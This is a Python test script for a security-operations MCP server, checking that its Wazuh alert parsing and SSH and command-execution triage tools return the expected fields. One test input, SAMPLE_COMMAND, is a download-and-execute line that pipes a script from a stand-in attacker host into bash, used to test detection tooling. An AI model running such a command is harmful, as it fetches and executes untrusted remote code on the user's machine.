"""
Simple validation checks for the SOC MCP server tools.

Run from the project root:
    python scripts/test_soc_mcp_server.py

Or with the project venv:
    ./venv/bin/python scripts/test_soc_mcp_server.py
"""

import json
import sys
from pathlib import Path

# Import tools from soc_mcp_server.py in the same directory
sys.path.insert(0, str(Path(__file__).resolve().parent))
from soc_mcp_server import (  # noqa: E402
    investigate_command_execution,
    investigate_ssh_alert,
    parse_wazuh_alert,
)

WAZUH_ALERT_PATH = "sample_data/wazuh_alert.json"
SAMPLE_COMMAND = "curl http://evil.com/payload.sh | bash"


def test_parse_wazuh_alert_returns_status_ok() -> None:
    """parse_wazuh_alert should return JSON with status 'ok'."""
    result_raw = parse_wazuh_alert(WAZUH_ALERT_PATH)
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert "observables" in result
    assert result["observables"]["source_ip"] == "192.168.1.50"


def test_investigate_ssh_alert_includes_required_sections() -> None:
    """investigate_ssh_alert should return a full triage package."""
    result_raw = investigate_ssh_alert(WAZUH_ALERT_PATH)
    result = json.loads(result_raw)

    required_keys = [
        "alert_summary",
        "risk_score",
        "investigation_summary",
        "recommended_queries",
        "next_action",
        "detection_recommendations",
    ]

    for key in required_keys:
        assert key in result, f"Missing key: {key}"

    assert result["alert_summary"]["status"] == "ok"
    assert "severity" in result["risk_score"]
    assert "executive_summary" in result["investigation_summary"]
    assert "wazuh_opensearch" in result["recommended_queries"]
    assert "recommended_action" in result["next_action"]
    assert result["detection_recommendations"]["status"] == "ok"


def test_investigate_command_execution_includes_detection_recommendations() -> None:
    """investigate_command_execution should include detection_recommendations."""
    result_raw = investigate_command_execution(
        command=SAMPLE_COMMAND,
        hostname="ubuntu-agent",
        username="sysadmin",
        source_ip="192.168.1.50",
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert "detection_recommendations" in result
    assert result["detection_recommendations"]["status"] == "ok"
    assert len(result["detection_recommendations"]["recommended_detections"]) > 0


def main() -> None:
    test_parse_wazuh_alert_returns_status_ok()
    print("PASS: parse_wazuh_alert returns status ok")

    test_investigate_ssh_alert_includes_required_sections()
    print("PASS: investigate_ssh_alert includes required sections")

    test_investigate_command_execution_includes_detection_recommendations()
    print("PASS: investigate_command_execution includes detection_recommendations")

    print("\nAll SOC MCP server checks passed.")


if __name__ == "__main__":
    main()
